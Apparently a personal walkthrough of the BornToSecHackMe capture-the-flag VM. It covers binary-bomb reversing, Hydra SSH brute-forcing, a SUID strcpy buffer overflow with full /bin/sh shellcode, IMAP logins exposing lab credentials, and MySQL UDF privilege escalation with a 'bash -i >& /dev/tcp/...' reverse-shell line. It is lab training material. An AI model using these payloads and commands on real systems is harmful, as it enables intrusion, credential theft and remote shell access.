
Next we have to enter a six-character string of numbers on each character of which a [bitwise AND](https://en.wikipedia.org/wiki/Bitwise_operation) is applied the result of which should give the position of each letter of the word "giants" in this alphabet:
![[Pasted image 20240423193825.png]]
so:
```
char array.123[16] = "isrveawhobpnutfg";
g -> 15
i -> 0
a -> 5
n -> 11
t -> 13
s -> 1
```

The result of the AND operation is converted to a `char` before being used to dereference the array:
```c
void phase_5(char *param_1)
{
  int iVar1;
  char local_c [6];
  undefined local_6;
  
  iVar1 = string_length(param_1);
  if (iVar1 != 6) {
    explode_bomb();
  }
  iVar1 = 0;
  do {
    local_c[iVar1] = (&array.123)[(char)(param_1[iVar1] & 0xf)]; // 15
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  local_6 = 0;
  iVar1 = strings_not_equal(local_c,"giants");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```





And my program:
```c
#include <stdio.h>
#include <string.h>

int     happy_anding(int c) {
        int i = 0;
        while (i <= 255) {
                int lettre = i & 15;
                if (lettre == c) {
                        printf("bin: %d", lettre);
                        return lettre;
                }
                i++;
        }
        return -1;
}

int     main() {

        int array[6] = {15, 0, 5, 11, 13, 1};
        int i = 0;
        while (i < 6) {
                int lettre = happy_anding(array[i]);
                if (lettre == -1)
                        return 1;
                printf("letters: %d\n", lettre);
                i++;
        }
}
```





And finally the function `phase_6`:
```c
void phase_6(char *param_1)
{
  int *piVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  undefined1 *local_38;
  int *local_34 [6];
  int local_1c [6];
  
  local_38 = node1;
  read_six_numbers(param_1,(int)local_1c);
  iVar4 = 0;
  do {
    iVar2 = iVar4;
    if (5 < local_1c[iVar4] - 1U) {
      explode_bomb();
    }
    while (iVar2 = iVar2 + 1, iVar2 < 6) {
      if (local_1c[iVar4] == local_1c[iVar2]) {
        explode_bomb();
      }
    }
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);
  iVar4 = 0;
  do {
    iVar2 = 1;
    piVar3 = (int *)local_38;
    if (1 < local_1c[iVar4]) {
      do {
        piVar3 = (int *)piVar3[2];
        iVar2 = iVar2 + 1;
      } while (iVar2 < local_1c[iVar4]);
    }
    local_34[iVar4] = piVar3;
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);
  iVar4 = 1;
  piVar3 = local_34[0];
  do {
    piVar1 = local_34[iVar4];
    piVar3[2] = (int)piVar1;
    iVar4 = iVar4 + 1;
    piVar3 = piVar1;
  } while (iVar4 < 6);
  piVar1[2] = 0;
  iVar4 = 0;
  do {
    if (*local_34[0] < *(int *)local_34[0][2]) {
      explode_bomb();
    }
    local_34[0] = (int *)local_34[0][2];
    iVar4 = iVar4 + 1;
  } while (iVar4 < 5);
  return;
}
```











To resume:
```
Public speaking is very easy.
1 2 6 24 120 720
0 q 777
9
opuKMA
4 2 6 3 1 5
```

We now have a list of the possible results, and we will use [Hydra](https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial) to bruteforce the SSH service with this wordlist:

```shell
┌──(fab㉿kali)-[~]
└─$ hydra -l thor -p wordlist.txt 192.168.56.101 ssh
<SNIP>

```

Our credentials are:
```
thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

what's confirmed by the given hints:
```
HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

and we can connect via SSH as user thor:
```shell
┌──(fab㉿kali)-[~]
└─$ ssh thor@192.168.56.101
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
thor@192.168.56.101's password:
thor@BornToSecHackMe:~$ ls -la
total 37
drwxr-x--- 3 thor     thor   129 Oct 15  2015 .
drwxrwx--x 9 www-data root   126 Oct 13  2015 ..
-rwxr-x--- 1 thor     thor     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 thor     thor   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 thor     thor  3489 Oct 13  2015 .bashrc
drwx------ 2 thor     thor    43 Oct 15  2015 .cache
-rwxr-x--- 1 thor     thor   675 Oct  8  2015 .profile
-rwxr-x--- 1 thor     thor    69 Oct  8  2015 README
-rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
thor@BornToSecHackMe:~$
```
### The Turtle

`turtle` is an ASCII text file containing a series of instructions that, translated into "[turtle](https://pythonsandbox.com/turtle) code" lead to the word "SLASH":
![[pythonsandbox-canvas.png]]
```shell
┌──(fab㉿kali)-[~]
└─$ file turtle
turtle: ASCII text

┌──(fab㉿kali)-[~]
└─$ cat turtle
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
<SNIP>

Can you digest the message? :)
thor@BornToSecHackMe:~$
```

I was like "digest"? What does ["message digest"](https://www.techopedia.com/definition/4024/message-digest) mean?
"A message digest is a cryptographic hash function containing a string of digits created by a one-way hashing formula."

After having tried to hash the word "SLASH" with `sha1sum` and `sha256sum`, we tried `md5sum` and got it:
```shell
┌──(fab㉿kali)-[~]
└─$ echo -n SLASH > slash.txt

┌──(fab㉿kali)-[~]
└─$ md5sum slash.txt
646da671ca01bb5d84dbb5fb2238dc8e  slash.txt

┌──(fab㉿kali)-[~]
└─$
```

So we have:
```
zaz:646da671ca01bb5d84dbb5fb2238dc8e
```
and we can run `su zaz`:
```shell
thor@BornToSecHackMe:~$ su zaz
Password:
zaz@BornToSecHackMe:~$
```

### A Buffer Overflow

The executable file we find has an SUID and an SGID:
```shell
zaz@BornToSecHackMe:~$ ls -la
total 12
drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
drwxrwx--x 1 www-data root   60 Oct 13  2015 ..
-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
zaz@BornToSecHackMe:~$ file exploit_me
exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
zaz@BornToSecHackMe:~$
```

```shell
┌──(fab㉿kali)-[~]
└─$ scp zaz@192.168.56.101:/home/zaz/exploit_me ./
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@192.168.56.101's password:
exploit_me                                                                            100% 4880     1.2MB/s   00:00

┌──(fab㉿kali)-[~]
└─$ ghidra
```

We probably have to make a buffer overflow, since there's a `puts()` function waiting for an input and a totally useless `main()` function:
```shell
bool main(int param_1,int param_2)
{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}
```

Since the LibC is used, we can maybe make the program [call a function](https://reverseengineering.stackexchange.com/questions/27826/using-a-buffer-overflow-to-call-a-function) like `execve()` through a [buffer overflow](https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow):
![[Pasted image 20240424184520.png]]

Among the tools available by default on Linux to analyze an executable, we have `readelf`, `objdumps`, `nm`, `gdb`, `dmesg`.. Please refer to this [write-up](https://jaybailey216.com/pwn-challenge-bat-computer) to see some of these tools at work.

To create a buffer overflow we can use Python:
```shell
./exploit_me $(python -c "print '\x90'*37+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*100 +'\xb0\xf6\xff\xbf'")
```

However, for this challenge we will use Perl.

To understand what to do, we will use [PEDA](https://github.com/longld/peda), which stands for Python Exploit Development Assistance for GDB.

We launch our executable and we test it with a line of 'A' longer than 140 characters, the size of the `local_90` buffer:
```shell
┌──(fab㉿kali)-[~/rainfall/b2r]
└─$ gdb exploit_me
```
![[Pasted image 20240425135544.png]]
![[Pasted image 20240425135608.png]]
We see that the EBP register contains the hexadecimal string 0x41414141, (four times the letter 'A'), as we can see from the ASCII table:
![[Pasted image 20240425135520.png]]

Our goal is to enter malicious code into the EIP register.

We try to make the program crash with a random string of 200 characters:
```shell
┌──(fab㉿kali)-[~]
└─$ msf-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

┌──(fab㉿kali)-[~]
└─$
```

![[Pasted image 20240425141610.png]]

We calculate the offset towards EIP, by taking the string contained in EIP ("6Ae7"):
```shell
┌──(fab㉿kali)-[~]
└─$ msf-pattern_offset -q 6Ae7
[*] Exact match at offset 140

┌──(fab㉿kali)-[~]
└─$
```
We need to pad our input with 140 characters before adding our shellcode that will be written on the memory (for understanding how to create a shellcode, refer to [this link](https://www.arsouyes.org/blog/2019/54_Shellcode/index.en.html), and [here](http://shell-storm.org/shellcode/index.html) is a large corpus of shellcodes).

However, we need to find the address of the ESP where a pointer to the previous instruction is stored:
```shell
gdb-peda$ run `perl -e 'print "A"x140'`
<SNIP>

gdb-peda$ info frame
Stack level 0, frame at 0xffffcecc:
 eip = 0xf7da3701; saved eip = 0xffffcf80
 called by frame at 0x41414149
 Arglist at 0x41414141, args:
 Locals at 0x41414141, Previous frame's sp is 0xffffcecc
 Saved registers:
  ebx at 0xffffcec0, esi at 0xffffcec4, eip at 0xffffcec8
gdb-peda$ print $esp
$1 = (void *) 0xffffcec0
gdb-peda$ q

┌──(fab㉿kali)-[~/rainfall/b2r]
└─$ ./exploit_me `perl -e 'print "A"x140 . "\xc0\xce\xff\xff" . "\x90"x30 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
```
It doesn't work, but it doesn't matter, because:
1. the address contained in ESP will be different in the remote session;
2. the shellcode has to be adapted to the system architecture of the executable file.

I had it work by slightly modifying my command and by adding a different shellcode, found [here](https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow).

For a start, I made the program crash and ran the `dmesg` command to find the address of the ESP:
```shell
zaz@BornToSecHackMe:~$ dmesg | tail -1
[21309.218795] exploit_me[18468]: segfault at 46b0c031 ip 46b0c031 sp bffff6b0 error 14
zaz@BornToSecHackMe:~$
```
![[Pasted image 20240425154932.png]]
And then I smashed it:
```shell
zaz@BornToSecHackMe:~$ dmesg | tail -1
[21309.218795] exploit_me[18468]: segfault at 46b0c031 ip 46b0c031 sp bffff6b0 error 14
zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . "\xb0\xf6\xff\xbf" . "\x90"x35 . "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"'`
```
![[Pasted image 20240425153034.png]]

And I'm root!




### Cutting through IMAP

In the home directory of zaz, in a folder named `mail/.imap/` we find some [Dovecot](https://www.dovecot.org)[logs](https://doc.dovecot.org/admin_manual/logging) with what resembles to an error message (the [Internet Message Access Protocol](https://www.cloudflare.com/learning/email-security/what-is-imap) is a protocol allowing access to an e-mail account, while [Simple Mail Transfer Protocol](https://www.cloudflare.com/learning/email-security/what-is-smtp) is a technical standard for transmitting electronic mail over a network):
```shell
zaz@BornToSecHackMe:~/mail/.imap$ ls -la
total 1
drwxr-x--- 5 zaz zaz  99 Oct  8  2015 .
drwxr-x--- 3 zaz zaz 107 Oct  8  2015 ..
-rwxr-x--- 1 zaz zaz  72 Oct  8  2015 dovecot.mailbox.log
drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Drafts
drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Sent
drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Trash
zaz@BornToSecHackMe:~/mail/.imap$ cat INBOX.Drafts/dovecot.index.log
(��V��V����@���mbox���� ��V�'��V�Y9�K|���� ��V���� @�zaz@BornToSecHackMe:~/mail/.imap$ pwd
/home/zaz/mail/.imap
zaz@BornToSecHackMe:~/mail/.imap$ cat dovecot.mailbox.log
�v�}<~�q��~�&V�
9�oh�P`V�!�RCN�j�6i��0V�zaz@BornToSecHackMe:~/mail/.imap$
```

Something is going on here... Let's investigate.

To read the logs I need the command [`doveadm log`](https://doc.dovecot.org/3.0/man/doveadm-log.1), the utility `doveadm` being of course installed in the host machine:
```shell
zaz@BornToSecHackMe:~/mail/.imap$ doveadm
usage: doveadm [-Dv] [-f <formatter>] <command> [<args>]

  altmove      [-u <user>|-A] [-S <socket_path>] [-r] <search query>
  auth         [-a <auth socket path>] [-x <auth info>] <user> [<password>]
  config       [doveconf parameters]
  director     add|dump|flush|map|move|remove|ring|status
  dump         [-t <type>] <path>
  expunge      [-u <user>|-A] [-S <socket_path>] <search query>
  fetch        [-u <user>|-A] [-S <socket_path>] <fields> <search query>
  force-resync [-u <user>|-A] [-S <socket_path>] <mailbox>
  help         <cmd>
  import       [-u <user>|-A] [-S <socket_path>] <source mail location> <dest parent mailbox> <search query>
  index        [-u <user>|-A] [-S <socket_path>] <mailbox mask>
  kick         [-a <anvil socket path>] [-f] <user mask>[|]<ip/bits>
  log          find|reopen|test
  mailbox      create|delete|list|mutf7|rename|status|subscribe|unsubscribe
  move         [-u <user>|-A] [-S <socket_path>] <destination> <search query>
  penalty      [-a <anvil socket path>] [<ip/bits>]
  proxy        kick|list
  purge        [-u <user>|-A] [-S <socket_path>]
  pw           [-l] [-p plaintext] [-r rounds] [-s scheme] [-u user] [-V]
  reload
  search       [-u <user>|-A] [-S <socket_path>] <search query>
  sis          deduplicate|find
  stop
  user         [-a <userdb socket path>] [-x <auth info>] [-f field] <user mask> [...]
  who          [-a <anvil socket path>] [-1] [<user mask>] [<ip/bits>]
zaz@BornToSecHackMe:~/mail/.imap$ doveadm mailbox list
INBOX.Drafts
INBOX.Sent
INBOX.Trash
zaz@BornToSecHackMe:~/mail/.imap$ doveadm auth -a /var/run/dovecot/master.pid zaz
Password:
doveadm(zaz): Error: auth: connect(/var/run/dovecot/master.pid) failed: Permission denied (euid=1005(zaz) egid=1005(zaz) missing +r perm: /var/run/dovecot/master.pid, dir owned by 0:0 mode=0755)
zaz@BornToSecHackMe:~/mail/.imap$ doveadm log find .
Looking for log files from .
Debug: Not found
Info: Not found
Warning: Not found
Error: Not found
Fatal: Not found
zaz@BornToSecHackMe:~/mail/.imap$ ls
dovecot.mailbox.log  INBOX.Drafts  INBOX.Sent  INBOX.Trash
zaz@BornToSecHackMe:~/mail/.imap$ doveadm log find ./INBOX.Drafts
Looking for log files from ./INBOX.Drafts
Debug: Not found
Info: Not found
Warning: Not found
Error: Not found
Fatal: Not found
zaz@BornToSecHackMe:~/mail/.imap$ file dovecot.mailbox.log
dovecot.mailbox.log: X11 SNF font data, LSB first
zaz@BornToSecHackMe:~/mail/.imap$
```
Nothing to be found ([X11](https://nwalsh.com/comp.fonts/FAQ/cf_94.htm) is a font).

Maybe zaz has valid credentials to connect via [IMAP](https://www.atmail.com/blog/imap-commands) ([here](https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet) is another command list):
```shell
┌──(fab㉿kali)-[~]
└─$ openssl s_client -connect 192.168.56.101:143 -starttls imap -crlf -quiet
Can't use SSL_get_servername
depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
verify error:num=18:self-signed certificate
verify return:1
depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
verify return:1
. OK Pre-login capabilities listed, post-login capabilities have more.
A1 login zaz 646da671ca01bb5d84dbb5fb2238dc8e
* CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS MULTIAPPEND UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS
A1 OK Logged in
A2 LIST "" "*"
* LIST (\NoInferiors \UnMarked) "/" "INBOX.Drafts"
* LIST (\NoInferiors \UnMarked) "/" "INBOX.Sent"
* LIST (\NoInferiors \UnMarked) "/" "INBOX.Trash"
* LIST (\HasNoChildren) "/" "INBOX"
A2 OK List completed.
A3 EXAMINE INBOX.Drafts
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS ()] Read-only mailbox.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1444339880] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
A3 OK [READ-ONLY] Select completed.
A3 EXAMINE INBOX.Sent
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS ()] Read-only mailbox.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1444339881] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
A3 OK [READ-ONLY] Select completed.
A3 EXAMINE INBOX.Trash
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS ()] Read-only mailbox.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1444339871] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
A3 OK [READ-ONLY] Select completed.

```
I could log in! Hoever, I didn't find any message in the inbox...

I decided to download the files on my session to open them from there:
```
┌──(fab㉿kali)-[~]
└─$ scp zaz@192.168.56.101:/home/zaz/mail/.imap/INBOX.Drafts/dovecot.index.log ./
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@192.168.56.101's password:
dovecot.index.log                                                                     100%  148    68.9KB/s   00:00

┌──(fab㉿kali)-[~]
└─$ scp zaz@192.168.56.101:/home/zaz/mail/.imap/dovecot.mailbox.log ./
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@192.168.56.101's password:
dovecot.mailbox.log                                                                   100%   72    25.3KB/s   00:00

┌──(fab㉿kali)-[~]
└─$
```

To do that I had to install Dovecot on my session, for which I needed to:
- download a [release](https://www.dovecot.org/download);
- launch:
```shell
$ cd ~/dovecot
$ ./configure
$ make
$ sudo make install
```
- add a [script](https://doc.dovecot.org/installation_guide/startup_scripts/sample_dovecot_init.d_script) to the `/etc/init.d` directory;
- launch the `~/dovecot/doc/mkcert.sh` script to create a [certificate](https://doc.dovecot.org/admin_manual/ssl/certificate_creation) (I had to modify the path of the `~/dovecot/doc/dovecot-openssl.cnf` file);
- [create unprivileged users](https://doc.dovecot.org/configuration_manual/howto/simple_virtual_install) **dovecot** and **dovenull** if they don’t exist yet ([without password](https://unix.stackexchange.com/questions/56765/creating-a-user-without-a-password)).

Finally I could type:
```shell
┌──(fab㉿kali)-[~/dovecot-2.3.21]
└─$ sudo service dovecot restart
Restarting Dovecot.

┌──(fab㉿kali)-[~/dovecot-2.3.21]
└─$ sudo doveadm reload

```

But I don't seem to be able to read them with this method...
```shell
┌──(fab㉿kali)-[~]
└─$ openssl s_client -connect 192.168.56.101:143 -starttls imap -crlf -quiet
Can't use SSL_get_servername
depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
verify error:num=18:self-signed certificate
verify return:1
depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
verify return:1
. OK Pre-login capabilities listed, post-login capabilities have more.
A1 login thor Publicspeakingisveryeasy.126241207201b2149opekmq426135
* CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS MULTIAPPEND UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS
A1 OK Logged in
A2 LIST "" "*"
* LIST (\HasNoChildren) "/" "INBOX"
A2 OK List completed.

```
I tried to connect to IMAP server with users such as `thor` and `laurie` (couldn't connect as `lmezard` because of bad characters in the password, that are refused by IMAP) but their inbox is empty.

When I connected as `laurie@borntosec.net`, however, I discovered they sent the mails they had received from `qudevide@mail.borntosec.net` to user `ft_root`, and that's suspect:
```shell
┌──(fab㉿kali)-[~]
└─$ openssl s_client -connect 192.168.56.101:143 -starttls imap -crlf -quiet
Can't use SSL_get_servername
depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
verify error:num=18:self-signed certificate
verify return:1
depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
verify return:1
. OK Pre-login capabilities listed, post-login capabilities have more.
A1 login laurie@borntosec.net !q\]Ej?*5K5cy*AJ
* CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS MULTIAPPEND UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS
A1 OK Logged in
A2 list
A2 BAD Error in IMAP command LIST: Invalid reference.
A2 LIST
A2 BAD Error in IMAP command LIST: Invalid reference.
A2 LIST "" "*"
* LIST (\NoInferiors \UnMarked) "/" "INBOX.Drafts"
* LIST (\NoInferiors \UnMarked) "/" "INBOX.Sent"
* LIST (\NoInferiors \UnMarked) "/" "INBOX.Trash"
* LIST (\NoInferiors \UnMarked) "/" "INBOX"
A2 OK List completed.
A3 EXAMINE INBOX.Sent
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS ()] Read-only mailbox.
* 2 EXISTS
* 2 RECENT
* OK [UIDVALIDITY 1444339365] UIDs valid
* OK [UIDNEXT 3] Predicted next UID
* OK [HIGHESTMODSEQ 1] Highest
A3 OK [READ-ONLY] Select completed.
a4 FETCH 1 BODY[]
* 1 FETCH (BODY[] {1722}
Received: from 192.168.1.22
        (SquirrelMail authenticated user laurie@borntosec.net)
        by 192.168.1.8 with HTTP;
        Thu, 8 Oct 2015 23:22:45 +0200
Message-ID: <38e4cbc743bb95cd2402bf0bc47602b3.squirrel@192.168.1.8>
Date: Thu, 8 Oct 2015 23:22:45 +0200
Subject: Very interesting !!!!
From: laurie@borntosec.net
To: ft_root@mail.borntosec.net
User-Agent: SquirrelMail/1.4.22
MIME-Version: 1.0
Content-Type: text/plain;charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-Priority: 3 (Normal)
Importance: Normal

WinDev est un atelier de g�nie logiciel (AGL) �dit� par la soci�t�
fran�aise PC SOFT et con�u pour d�velopper des applications,
principalement orient�es donn�es pour Windows 8, 7, Vista, XP, 2008, 2003,
2000, mais �galement pour Linux, .Net et Java. Il propose son propre
langage, appel� le WLangage. La premi�re version de l'AGL est sortie en
1993. Apparent� � WebDev et WinDev Mobile.

La communaut� autour de WinDev
Tour De France Technique
Chaque ann�e, entre le mois de mars et le mois de mai, PC SOFT organise
dans toute la France ce qu'ils appellent le TDF Tech (Tour De France
Technique). Cet �v�nement d'une demi-journ�e a pour but d'informer et de
pr�senter les nouveaut�s de chaque version. Pendant cette courte
formation, les diff�rents intervenants utilisent un grand nombre
d'applications pr�-con�ues dans lesquelles ils ont int�gr� les multiples
nouveaut�s, tout en exploitant le mat�riel (serveurs, t�l�phones) qu'ils
ont apport�. Non seulement, WinDev est largement mis en avant, mais aussi
les autres environnements : WebDev et WinDev Mobile. Le code source des
sujets pr�sent�s ainsi qu'un support de cours sont remis � chaque
participant.
)
a4 OK Fetch completed.
a4 FETCH 2 body[]
* 2 FETCH (BODY[] {629}
Received: from 192.168.1.22
        (SquirrelMail authenticated user laurie@borntosec.net)
        by 192.168.1.8 with HTTP;
        Thu, 8 Oct 2015 23:25:25 +0200
Message-ID: <e231e4a59416c44fd367fc5eeff1e8f5.squirrel@192.168.1.8>
Date: Thu, 8 Oct 2015 23:25:25 +0200
Subject: DB Access
From: laurie@borntosec.net
To: ft_root@mail.borntosec.net
User-Agent: SquirrelMail/1.4.22
MIME-Version: 1.0
Content-Type: text/plain;charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-Priority: 3 (Normal)
Importance: Normal

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
)
a4 OK Fetch completed.
```

Let's test the credentials:
```
lmezard:!q\]Ej?*5K5cy*AJ
lmezard:G!@M6f4Eatau{sF"
```
with Thunderbird. To do this, we add `borntosec.net` to our `/etc/hosts` file:



















### Failed Attempts
#### Get Root from MySQL - A Dead End

According to [this article on Medium](https://rootrecipe.medium.com/mysql-to-system-root-ad8edc305d2b), a possibility would have been to inject the [lib_mysqludf_sys.so](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64) file as [blob](https://www.mysqltutorial.org/mysql-basics/mysql-blob) in a table to open a file in the `mysql` library in order to be able to [create a function](https://dev.mysql.com/doc/refman/8.0/en/create-function-loadable.html) allowing us to open a shell as user `root`. Unluckily, however, our `mysql` user has no permissions to write in the directory `/usr/lib/mysql/plugin`.

We transfer the file to the `/tmp` directory of the host machine:
```shell
┌──(fab㉿kali)-[~]
└─$ scp ./lib_mysqludf_sys.so thor@192.168.56.101:/tmp/
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
thor@192.168.56.101's password:
lib_mysqludf_sys.so                                                                   100% 3200     1.7MB/s   00:00

┌──(fab㉿kali)-[~]
└─$
```
Them we open a listener and insert the following code in the "SQL" tab of PHPMyAdmin:
```
use mysql;
create table carrot (line blob);
insert into carrot values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from carrot into dumpfile '/usr/lib/mysql/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('bash -i >& /dev/tcp/192.168.119.135/4444 0>&1');
```

The same method may apply to the [`raptor_udf2.so`](https://www.exploit-db.com/exploits/1518) file. We need to download and compile the [raptor_udf2.c](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c) file:
```shell
┌──(fab㉿kali)-[~]
└─$ gcc -g -c raptor_udf2.c

┌──(fab㉿kali)-[~]
└─$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

┌──(fab㉿kali)-[~]
└─$ scp raptor_udf2.so thor@192.168.56.101:/tmp/
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
thor@192.168.56.101's password:
raptor_udf2.so                                                                        100%   17KB   3.5MB/s   00:00

┌──(fab㉿kali)-[~]
└─$
```